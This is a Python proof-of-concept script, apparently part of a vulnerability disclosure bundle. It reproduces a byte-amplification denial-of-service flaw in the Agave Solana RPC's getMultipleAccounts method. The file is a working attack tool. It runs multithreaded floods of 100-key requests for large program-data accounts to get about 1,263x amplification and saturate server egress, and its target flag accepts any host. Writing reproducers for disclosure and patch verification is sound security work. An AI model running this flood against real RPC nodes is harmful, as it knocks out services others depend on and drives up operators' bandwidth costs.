#!/usr/bin/env python3
"""SOL_F10 reproducer — getMultipleAccounts byte amplification.

Standalone reproducer for the SOL_F10 finding in the NullRabbit
2026-04-30 Agave RPC disclosure bundle. Self-contained Python 3
stdlib only; no third-party dependencies.

Target: agave v3.1.9, commit 765ee54adc4f574b1cd4f03a5500bf46c0af0817
Tested against: solana-test-validator 2.2.16 (single-process,
                127.0.0.1:8899)

Mechanism: getMultipleAccounts accepts up to MAX_MULTIPLE_ACCOUNTS=100
pubkeys per request. The handler iterates the supplied pubkey list
sequentially, each lookup wrapped in spawn_blocking for
get_encoded_account, and serialises account data via the requested
encoding. There is no per-account or per-response size cap. When the
100 pubkeys all resolve to the BPF Loader v2 program-data stub
(carried by Token, BPFLoader2, BPFLoaderUpgradeable program-data
accounts at ~178 KB each), each request returns a ~6.06 MB response
from a ~4.8 KB request — 1,263× amplification.

Headline measurements at 8 attacker workers, 10s sustained:
    aggregate req/s        : 220.9
    per-request resp bytes : 6,062,041 (6.06 MB)
    amplification ratio    : 1,263×
    sustained server egress: 1,344 MB/s

Per-worker shape — what to expect at each --workers setting:
    --workers 8  (default, headline) : ~220 req/s aggregate, ~1,344 MB/s egress
    --workers 2  (smoke-test mode)   : ~180 req/s aggregate, ~1,100 MB/s egress
                                        (proportional to 8-worker;
                                         per-request shape unchanged)
    --workers 1  (baseline)          : ~85 req/s, ~517 MB/s egress
The amplification ratio (1,263×) is shape-architectural and constant
across worker counts; only aggregate rate and sustained server
egress scale.

Source citations (agave v3.1.9 / 765ee54):
    rpc/src/rpc.rs:558-588   pub async fn get_multiple_accounts
    rpc/src/rpc.rs:3230-3238 MAX_MULTIPLE_ACCOUNTS dispatch cap

Usage:

    # 8-worker / 10s saturating mode (matches headline measurement)
    python3 SOL_F10_repro.py --target http://127.0.0.1:8899 \\
        --workers 8 --duration 10

    # 1-thread baseline (for amp-ratio confirmation without saturation)
    python3 SOL_F10_repro.py --workers 1 --duration 30
"""

from __future__ import annotations

import argparse
import json
import statistics
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.client import HTTPConnection
from urllib.parse import urlparse

# These three program addresses each carry the BPF Loader v2
# program-data stub (~178 KB) on a default test-validator. Cycling
# 100 keys across them maximises per-request response bytes while
# staying within MAX_MULTIPLE_ACCOUNTS=100.
HEAVY_KEYS = [
    "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
    "BPFLoader2111111111111111111111111111111111",
    "BPFLoaderUpgradeab1e11111111111111111111111",
]


def build_body(keys_per_request: int) -> bytes:
    keys = [HEAVY_KEYS[i % len(HEAVY_KEYS)] for i in range(keys_per_request)]
    return json.dumps({
        "jsonrpc": "2.0", "id": 1,
        "method": "getMultipleAccounts",
        "params": [keys, {"encoding": "base64"}],
    }).encode()


def send_one(host: str, port: int, body: bytes, timeout: float):
    """One request; returns (status, resp_bytes, duration_ns)."""
    t0 = time.monotonic()
    status = None
    resp_bytes = 0
    try:
        conn = HTTPConnection(host, port, timeout=timeout)
        conn.request("POST", "/", body, {
            "Content-Type": "application/json",
            "Content-Length": str(len(body)),
        })
        resp = conn.getresponse()
        body_resp = resp.read()
        status = resp.status
        resp_bytes = len(body_resp)
        conn.close()
    except Exception as e:
        print(f"  request error: {e}", file=sys.stderr)
    return status, resp_bytes, int((time.monotonic() - t0) * 1e9)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", default="http://127.0.0.1:8899")
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--keys-per-request", type=int, default=100,
                    help="MAX_MULTIPLE_ACCOUNTS=100 server-side cap")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 8899
    body = build_body(args.keys_per_request)

    print(f"SOL_F10 reproducer — agave v3.1.9 / 765ee54")
    print(f"target           : {host}:{port}")
    print(f"workers          : {args.workers}")
    print(f"duration         : {args.duration}s")
    print(f"keys per request : {args.keys_per_request}")
    print(f"request body     : {len(body)} bytes")
    print()

    stop = threading.Event()
    results: list[tuple[int | None, int, int]] = []
    results_lock = threading.Lock()

    def worker_loop() -> int:
        n = 0
        while not stop.is_set():
            r = send_one(host, port, body, args.timeout)
            with results_lock:
                results.append(r)
            n += 1
        return n

    t_start = time.monotonic()
    deadline = t_start + args.duration
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [pool.submit(worker_loop) for _ in range(args.workers)]
        while time.monotonic() < deadline:
            time.sleep(0.1)
        stop.set()
        per_worker = [f.result() for f in futures]
    elapsed = time.monotonic() - t_start

    n = len(results)
    if n == 0:
        print("No completed requests.", file=sys.stderr)
        return 1

    ok_count = sum(1 for s, _, _ in results if s == 200)
    sizes = [b for _, b, _ in results if b > 0]
    durs_ms = [d / 1e6 for _, _, d in results]
    durs_ms.sort()

    total_resp_bytes = sum(b for _, b, _ in results)
    egress_mbps = total_resp_bytes / 1e6 / elapsed
    amp_mean = statistics.mean(sizes) / len(body) if sizes else 0
    p50 = durs_ms[n // 2]
    p99 = durs_ms[min(n - 1, int(0.99 * n))]

    print(f"=== results ===")
    print(f"  total requests        : {n}")
    print(f"  http 200              : {ok_count} ({ok_count/n*100:.1f}%)")
    print(f"  aggregate req/s       : {n/elapsed:.1f}")
    print(f"  per-worker req/s      : {n/elapsed/args.workers:.1f}")
    print(f"  per-request resp avg  : {statistics.mean(sizes):,.0f} bytes")
    print(f"  per-request resp max  : {max(sizes):,} bytes")
    print(f"  amplification ratio   : {amp_mean:,.0f}×")
    print(f"  total response bytes  : {total_resp_bytes/1e6:,.1f} MB")
    print(f"  sustained server egress: {egress_mbps:,.1f} MB/s")
    print(f"  p50 latency           : {p50:.1f} ms")
    print(f"  p99 latency           : {p99:.1f} ms")
    print()
    print(f"Headline reference measurement at workers=8, duration=10s:")
    print(f"  aggregate req/s       : 220.9")
    print(f"  per-request resp size : 6,062,041 bytes (6.06 MB)")
    print(f"  amplification ratio   : 1,263×")
    print(f"  sustained egress      : 1,344 MB/s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
